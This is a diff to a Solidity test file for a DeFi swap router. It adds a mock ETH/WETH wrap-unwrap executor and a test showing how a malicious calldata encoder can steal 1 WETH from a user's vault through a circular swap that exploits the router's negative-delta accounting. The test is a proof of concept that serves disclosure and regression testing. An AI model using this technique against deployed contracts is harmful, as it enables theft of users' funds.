@@ -8,7 +8,93 @@ import {
     RestrictTransferFrom__DifferentTokenIn
 } from "@src/RestrictTransferFrom.sol";
 import {Vault__UnexpectedInputDelta, ERC6909} from "@src/Vault.sol";
+import {IExecutor} from "@interfaces/IExecutor.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {
+    SafeERC20
+} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+import {IWETH} from "../lib/IWETH.sol";
 import "./TychoRouterTestSetup.sol";
+
+/**
+ * @title WrapUnwrapExecutor
+ * @notice Mock executor that wraps/unwraps ETH <-> WETH
+ * @dev Used for testing circular swaps with native ETH
+ */
+contract WrapUnwrapExecutor is IExecutor {
+    using SafeERC20 for IWETH;
+    using SafeERC20 for IERC20;
+
+    IWETH public immutable weth;
+
+    constructor(address _weth) {
+        weth = IWETH(_weth);
+    }
+
+    // slither-disable-next-line locked-ether
+    function swap(uint256 amountIn, bytes calldata data)
+        external
+        payable
+        returns (uint256 amountOut, address tokenOut, address receiver)
+    {
+        address tokenIn;
+        (tokenIn, receiver) = _decodeData(data);
+
+        if (tokenIn == address(weth)) {
+            // WETH -> ETH: Unwrap
+            weth.withdraw(amountIn);
+            amountOut = amountIn;
+            tokenOut = address(0);
+
+            if (receiver != address(this)) {
+                Address.sendValue(payable(receiver), amountOut);
+            }
+        } else {
+            // ETH -> WETH: Wrap
+            weth.deposit{value: amountIn}();
+            amountOut = amountIn;
+            tokenOut = address(weth);
+
+            if (receiver != address(this)) {
+                weth.safeTransfer(receiver, amountOut);
+            }
+        }
+    }
+
+    function _decodeData(bytes calldata data)
+        internal
+        pure
+        returns (address tokenIn, address receiver)
+    {
+        tokenIn = address(bytes20(data[0:20]));
+        receiver = address(bytes20(data[20:40]));
+    }
+
+    /// @dev Required to receive ETH
+    receive() external payable {}
+
+    function getTransferData(bytes calldata data)
+        external
+        payable
+        returns (
+            RestrictTransferFrom.TransferType transferType,
+            address receiver,
+            address tokenIn
+        )
+    {
+        tokenIn = address(bytes20(data[0:20]));
+        receiver = address(bytes20(data[20:40]));
+
+        if (tokenIn == address(weth)) {
+            transferType = RestrictTransferFrom.TransferType(uint8(data[40]));
+        } else {
+            // ETH -> WETH: Need to transfer ETH via msg.value
+            transferType =
+            RestrictTransferFrom.TransferType.TransferNativeInMsgValue;
+        }
+    }
+}
 
 /**
  * @title TychoRouterTransferFromTest
@@ -610,5 +696,105 @@ contract TychoRouterProtocolWillDebitTest is TychoRouterTestSetup {
             swap
         );
         vm.stopPrank();
+    }
+}
+
+contract CircularVaultTest is TychoRouterTestSetup {
+    WrapUnwrapExecutor public wrapUnwrapExecutor;
+
+    function setUp() public override {
+        super.setUp();
+        wrapUnwrapExecutor = new WrapUnwrapExecutor(WETH_ADDR);
+
+        // Add wrapUnwrapExecutor to allowed executors
+        address[] memory executors = new address[](1);
+        executors[0] = address(wrapUnwrapExecutor);
+        vm.startPrank(EXECUTOR_SETTER);
+        tychoRouter.setExecutors(executors);
+        vm.stopPrank();
+    }
+
+    function testCircularSwapStealsWETH() public {
+        // Circular swap: WETH -> ETH -> WETH -> USDC
+        // First two swaps use mock WrapUnwrapExecutor
+        // Last swap uses UniswapV2
+        //
+        // Alice didn't realize that she is actually using Bob the malicious encoder.
+        // She believed in a trust-less encoding system and failed to check her own
+        // calldata. Guardrails did not serve her well.
+        //
+        // 1. Alice sends 1 WETH to the router via transferFrom. Delta accounting for
+        //    WETH is 1
+        // 2. Alice swaps WETH to ETH. Delta accounting for WETH is 0.
+        // 3. Alice swaps WETH, but Bob the malicious encoder set the receiver to
+        //    himself. Delta accounting for WETH is 0.
+        // 4. The router sends WETH to USDC. Delta accounting for WETH is -1.
+        // 5. Since we allow one negative delta for the input amount, Bob has
+        //    successfully managed to obtain 1 WETH without Alice noticing
+        bytes[] memory swaps = new bytes[](3);
+
+        // Swap 1: WETH -> ETH (unwrap)
+        swaps[0] = encodeSequentialSwap(
+            address(wrapUnwrapExecutor),
+            abi.encodePacked(
+                WETH_ADDR, // tokenIn
+                tychoRouterAddr, // receiver
+                RestrictTransferFrom.TransferType.TransferFrom
+            )
+        );
+
+        // Swap 2: ETH -> WETH (wrap)
+        swaps[1] = encodeSequentialSwap(
+            address(wrapUnwrapExecutor),
+            abi.encodePacked(
+                address(0), // tokenIn (ETH)
+                BOB, // receiver - BOB maliciously encoded himself as the receiver,
+                // stealing weth from Alice's Vault without her realizing
+                RestrictTransferFrom.TransferType.None // This will be replaced with ProtocolWillDebit
+            )
+        );
+
+        // Swap 3: WETH -> USDC (UniswapV2)
+        swaps[2] = encodeSequentialSwap(
+            address(usv2Executor),
+            encodeUniswapV2Swap(
+                USDC_WETH_USV2,
+                tychoRouterAddr, // receiver
+                false, // WETH is token0, USDC is token1, so we're swapping token0 -> token1
+                RestrictTransferFrom.TransferType.Transfer
+            )
+        );
+
+        uint256 amountIn = 1 ether;
+        deal(WETH_ADDR, ALICE, amountIn * 2);
+
+        vm.startPrank(ALICE);
+        IERC20(WETH_ADDR).approve(tychoRouterAddr, amountIn * 2);
+
+        // Alice has 1 WETH in the vault, and 1 WETH in her own wallet for swapping.
+        tychoRouter.deposit(WETH_ADDR, amountIn);
+
+        uint256 amountOut = tychoRouter.sequentialSwap(
+            amountIn,
+            WETH_ADDR,
+            USDC_ADDR,
+            1, // min amount
+            ALICE, // receiver
+            true, // transferFrom
+            0, // solver fee bps
+            address(0), // solver fee receiver
+            0, // max solver contribution
+            pleEncode(swaps)
+        );
+        vm.stopPrank();
+
+        // Alice received her output, paid for her input, and Bob stole 1
+        // WETH from Alice
+        assertGt(amountOut, 0);
+        assertEq(IERC20(USDC_ADDR).balanceOf(ALICE), amountOut);
+        assertEq(IERC20(WETH_ADDR).balanceOf(BOB), 1 ether);
+
+        // TychoRouter WETH is now depleted, as are Alice's vault funds.
+        assertEq(IERC20(WETH_ADDR).balanceOf(tychoRouterAddr), 0);
     }
 }
